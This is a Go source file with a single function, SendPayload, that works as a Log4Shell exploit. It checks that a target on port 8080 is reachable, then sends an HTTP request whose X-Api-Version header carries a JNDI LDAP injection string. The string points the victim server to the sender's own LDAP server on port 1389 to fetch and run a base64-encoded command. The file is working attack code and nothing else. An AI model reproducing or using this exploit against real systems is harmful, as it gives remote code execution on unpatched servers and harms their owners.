package functions

import (
	"encoding/base64"
	"errors"
	"io"
	"net"
	"net/http"
	"time"
)

func SendPayload(payload string, targetip string) (string, error) {
	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return "", err
	}
	intIP, err := GetIntIP()
	if err != nil {
		return "", err
	}
	target := targetip + ":8080"
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return "", errors.New("target is not reachable")
	}
	conn.Close()
	reqPayload := "${jndi:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("X-Api-Version", reqPayload)
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	respPayload, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if string(respPayload) == "Hello, world!" {
		return "Payload sent successfully to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload, nil
	} else {
		return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload + " and Response-Payload: " + string(respPayload), nil
	}
}
